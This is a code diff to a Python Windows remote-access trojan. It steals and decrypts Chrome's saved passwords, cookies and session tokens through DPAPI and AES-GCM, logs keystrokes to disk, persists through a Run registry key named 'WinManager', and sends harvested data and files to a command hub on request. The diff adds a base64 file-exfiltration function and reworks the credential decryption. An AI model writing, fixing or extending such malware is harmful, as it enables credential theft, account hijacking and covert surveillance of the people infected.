@@ -17,11 +17,10 @@ import threading
 import time
 import uuid
 import winreg
-import win32crypt
 from urllib.parse import urlparse
 
 def install_dependencies():
-    required = ['pyautogui', 'pycryptodome', 'requests', 'mss', 'Pillow', 'websocket-client']
+    required = ['pyautogui', 'pycryptodome', 'requests', 'mss', 'Pillow', 'websocket-client', 'pywin32']
     for lib in required:
         try:
             __import__(lib if lib != 'pycryptodome' else 'Crypto')
@@ -89,7 +88,7 @@ except ImportError:
     psutil = None
     PSUTIL_AVAILABLE = False
 
-REQUIRED_PACKAGES = ['pynput', 'pycryptodome', 'mss', 'Pillow', 'pyperclip']
+REQUIRED_PACKAGES = ['pynput', 'pycryptodome', 'mss', 'Pillow', 'pyperclip', 'pywin32']
 
 # Default command hub settings. These values can be overridden by
 # environment variables KING_HUB_IP / KING_HUB_PORT or by passing
@@ -112,22 +111,6 @@ keylog_thread = None
 clipboard_active = False
 clipboard_thread = None
 last_clipboard = ''
-
-
-def get_master_key():
-    # THE KEY TO THE WONDER: Unlocks the Chrome encryption gate
-    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
-    with open(path, "r", encoding="utf-8") as f:
-        local_state = json.load(f)
-    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
-    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
-
-def decrypt_v10(value, key):
-    try:
-        iv, payload = value[3:15], value[15:]
-        cipher = AES.new(key, AES.MODE_GCM, iv)
-        return cipher.decrypt(payload)[:-16].decode()
-    except: return "[Decryption Failed]"
 
 
 def silent_bootstrap():
@@ -187,6 +170,48 @@ def send_atomic_data(s, type, data, filename, is_websocket=False):
         return False
 
 
+def get_master_key():
+    # THE KEY TO THE WONDER: Unlocks the Chrome encryption gate
+    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
+    if not os.path.exists(path): return None
+    with open(path, "r", encoding="utf-8") as f:
+        local_state = json.load(f)
+    # Extract key and strip DPAPI prefix
+    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+
+
+def decrypt_v10(value, key):
+    try:
+        iv, payload = value[3:15], value[15:]
+        cipher = AES.new(key, AES.MODE_GCM, iv)
+        return cipher.decrypt(payload)[:-16].decode()
+    except:
+        return "[Decryption Failed]"
+
+
+def send_binary(s, file_path):
+    if not os.path.exists(file_path):
+        try:
+            s.sendall(b"ERROR|File not found\n")
+        except Exception:
+            pass
+        return False
+    try:
+        with open(file_path, "rb") as f:
+            # Encoding to Base64 prevents socket 'choking' on binary bytes
+            encoded_data = base64.b64encode(f.read()).decode()
+            header = f"BINARY_OUT|{os.path.basename(file_path)}|"
+            s.sendall((header + encoded_data + "\n").encode())
+        return True
+    except Exception as e:
+        try:
+            print(f'[-] send_binary failed: {e}')
+        except Exception:
+            pass
+        return False
+
+
 def run_detached():
     """Restart this process in detached mode."""
     if platform.system() != 'Windows':
@@ -210,28 +235,13 @@ def start_keylogger():
     keylog_data = ''
 
     def on_press(key):
-        global keylog_data
+        # Write raw key representation immediately and flush to disk
         try:
-            keylog_data += key.char
-            char = key.char
-        except AttributeError:
-            if key == keyboard.Key.space:
-                keylog_data += ' '
-                char = ' '
-            elif key == keyboard.Key.enter:
-                keylog_data += '\n'
-                char = '\n'
-            elif key == keyboard.Key.tab:
-                keylog_data += '\t'
-                char = '\t'
-            else:
-                char = f'[{key}]'
-                keylog_data += char
-        
-        # --- KEYLOGGER FIX (FLUSH TO DISK) ---
-        with open("keylog.txt", "a") as f:
-            f.write(str(char))
-            f.flush() # This ensures size is NEVER 0 when requested
+            with open("keylog.txt", "a", encoding="utf-8") as f:
+                f.write(str(key))
+                f.flush() # CRITICAL: This ensures size is NEVER 0 when requested
+        except Exception:
+            pass
 
     listener = keyboard.Listener(on_press=on_press)
     keylog_thread = threading.Thread(target=listener.start, daemon=True)
@@ -660,52 +670,14 @@ def perform_self_update(remote_version, script_bytes):
         return False
 
 
-update_pending = False
-socket_lock = threading.Lock()
-
 def auto_update_monitor():
     """Monitor GitHub for updates in the background."""
-    global update_pending
     while True:
         try:
-            # Check for updates without performing immediate self-update
-            remote_version = get_remote_version()
-            if remote_version:
-                local_version = read_local_version()
-                if parse_semantic_version(remote_version) > parse_semantic_version(local_version):
-                    update_pending = True  # Set flag only, do not kill connection yet
+            check_for_updates()
         except Exception:
             pass
         time.sleep(UPDATE_CHECK_INTERVAL)
-
-
-def send_binary_file(s, path):
-    """Reliable binary file transfer with structured header and thread safety."""
-    if not os.path.exists(path) or not os.path.isfile(path):
-        return False
-    try:
-        import struct
-        filesize = os.path.getsize(path)
-        filename = os.path.basename(path)
-        
-        # Professional binary header: 4-byte BE filesize + 1-byte filename length + filename bytes
-        header = struct.pack(">I B", filesize, len(filename)) + filename.encode('utf-8')
-        
-        with socket_lock:
-            s.sendall(b"TRANSFER_START" + header)
-            
-            with open(path, "rb") as f:
-                while True:
-                    chunk = f.read(8192)
-                    if not chunk:
-                        break
-                    s.sendall(chunk)
-            
-            time.sleep(0.5)
-            s.sendall(b"TRANSFER_END")
-        return True
-    except Exception:
-        return False
 
 
 def safe_copy(source, destination):
@@ -742,8 +714,32 @@ def extract_chrome_credentials():
 
             with open(local_state_path, 'r', encoding='utf-8') as f:
                 local_state = json.load(f)
-            master_key = get_master_key()
-            if not master_key:
+            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
+
+            # --- THE "NO FROM_PARAM" FIX ---
+            class DATA_BLOB(ctypes.Structure):
+                _fields_ = [("cbData", ctypes.c_uint32), ("pbData", ctypes.POINTER(ctypes.c_char))]
+
+            # Explicitly define all 7 arguments to prevent the 'item 2' error
+            # We use c_void_p for the optional buffers
+            ctypes.windll.crypt32.CryptUnprotectData.argtypes = [
+                ctypes.POINTER(DATA_BLOB), # pDataIn
+                ctypes.c_void_p,           # pptrszDataDescr
+                ctypes.c_void_p,           # pOptionalEntropy
+                ctypes.c_void_p,           # pvReserved
+                ctypes.c_void_p,           # pPromptStruct
+                ctypes.c_uint32,           # dwFlags
+                ctypes.POINTER(DATA_BLOB)  # pDataOut
+            ]
+
+            blob_in = DATA_BLOB(len(encrypted_key), ctypes.create_string_buffer(encrypted_key))
+            blob_out = DATA_BLOB()
+
+            # Call with actual null pointers (0) instead of Python 'None'
+            if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), 0, 0, 0, 0, 0, ctypes.byref(blob_out)):
+                master_key = ctypes.string_at(blob_out.pbData, blob_out.cbData)
+                ctypes.windll.kernel32.LocalFree(blob_out.pbData)
+            else:
                 return b"Error: DPAPI Decryption Failed."
 
             # --- TOTAL RECOVERY SWEEP ---
@@ -775,8 +771,13 @@ def extract_chrome_credentials():
                                 password = " [No Password Saved] "
                                 if enc_pass:
                                     try:
+                                        # Try Modern Decryption
                                         if enc_pass.startswith(b'v10') or enc_pass.startswith(b'v11'):
-                                            password = decrypt_v10(enc_pass, master_key)
+                                            nonce = enc_pass[3:15]
+                                            payload = enc_pass[15:]
+                                            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+                                            # Try to decrypt and verify the tag
+                                            password = cipher.decrypt_and_verify(payload[:-16], payload[-16:]).decode('utf-8', errors='ignore')
                                         else:
                                             # Try Legacy DPAPI
                                             blob_in = DATA_BLOB(len(enc_pass), ctypes.create_string_buffer(enc_pass))
@@ -818,7 +819,12 @@ def extract_chrome_credentials():
                                         if not enc_val.startswith(b'v10'): continue
                                         
                                         try:
-                                            cookie_val = decrypt_v10(enc_val, master_key)
+                                            # Same AES-GCM Surgical Slice
+                                            nonce = enc_val[3:15]
+                                            payload = enc_val[15:]
+                                            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+                                            cookie_val = cipher.decrypt_and_verify(payload[:-16], payload[-16:]).decode('utf-8', errors='ignore')
+                                            
                                             if cookie_val:
                                                 cookie_output.append(f"Host: {host} | Name: {name} | Value: {cookie_val}")
                                         except:
@@ -855,7 +861,12 @@ def extract_chrome_credentials():
                                 if not enc_val.startswith(b'v10'): continue
                                 
                                 try:
-                                    decrypted_cookie = decrypt_v10(enc_val, master_key)
+                                    # Decrypt using your existing AES-GCM logic
+                                    nonce = enc_val[3:15]
+                                    payload = enc_val[15:]
+                                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+                                    decrypted_cookie = cipher.decrypt_and_verify(payload[:-16], payload[-16:]).decode('utf-8', errors='ignore')
+                                    
                                     if decrypted_cookie:
                                         cloning_output.append(f"COOKIE | Host: {host} | Name: {name} | Value: {decrypted_cookie}")
                                 except:
@@ -889,7 +900,12 @@ def extract_chrome_credentials():
                                 if not enc_val.startswith(b'v10'): continue
                                 
                                 try:
-                                    cookie_val = decrypt_v10(enc_val, master_key)
+                                    # Use the SAME decryption logic you have for passwords
+                                    nonce = enc_val[3:15]
+                                    payload = enc_val[15:]
+                                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+                                    cookie_val = cipher.decrypt_and_verify(payload[:-16], payload[-16:]).decode('utf-8', errors='ignore')
+                                    
                                     if cookie_val:
                                         ghost_output.append(f"SESSION_TOKEN | Host: {host} | Name: {name} | Value: {cookie_val}")
                                 except:
@@ -1222,11 +1238,7 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                             except Exception:
                                 pass
                         client.send(b'V_PULSE_EOF\n')
-                    elif command == 'KILL_AGENT' or command == 'TERMINATE':
-                        try:
-                            client.send(b"GHOST_EXITING\n")
-                        except Exception:
-                            pass
+                    elif command == 'KILL_AGENT':
                         try:
                             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
                             winreg.DeleteValue(key, 'WinManager')
@@ -1246,8 +1258,7 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                                 os.remove(target_file)
                         except Exception:
                             pass
-                        # Force immediate process termination - bypasses all finally blocks and loops
-                        os._exit(0)
+                        return
                     elif command == 'EXPLORE_DRIVES':
                         send_atomic_data(client, 'EXPLORE', json.dumps(explore_drives()).encode('utf-8'), 'drives.json', is_websocket=False)
                     elif command == 'HARVEST_USER':
@@ -1261,29 +1272,6 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                             client.send(b'DEPENDENCY_MISSING: pynput\nV_PULSE_EOF\n')
                         else:
                             send_atomic_data(client, 'KEYLOG', get_keylog_bytes(), 'keylog.txt', is_websocket=False)
-                    elif command == 'GET_COOKIES':
-                        try:
-                            m_key = get_master_key()
-                            c_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
-                            shutil.copyfile(c_path, "c_tmp")
-                            conn = sqlite3.connect("c_tmp")
-                            cursor = conn.cursor()
-                            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
-                            
-                            cookie_jar = []
-                            for host, name, value in cursor.fetchall():
-                                cookie_jar.append({
-                                    "domain": host,
-                                    "name": name,
-                                    "value": decrypt_v10(value, m_key)
-                                })
-                            conn.close()
-                            os.remove("c_tmp")
-                            # Send back as clean JSON
-                            response = json.dumps(cookie_jar, indent=4)
-                            client.sendall(f"COOKIES_DATA|{len(response)}|{response}".encode())
-                        except Exception as e:
-                            client.sendall(f"ERROR|{str(e)}".encode())
                     elif command.startswith('EXTRACT_FILE '):
                         file_path = command[13:].strip('"')
                         payload = extract_file_bytes(file_path)
@@ -1329,9 +1317,6 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                                 pyautogui.typewrite(text)
                             except Exception:
                                 pass
-                    elif command.startswith('DOWNLOAD '):
-                        file_path = command.split(" ", 1)[1].strip()
-                        send_binary_file(client, file_path)
                     else:
                         pass
         except ConnectionResetError:
@@ -1427,4 +1412,3 @@ if __name__ == '__main__':
     threading.Thread(target=auto_update_monitor, daemon=True).start()
 
     main_loop(args.hub_ip, args.hub_port, args.github_throne_url)
-
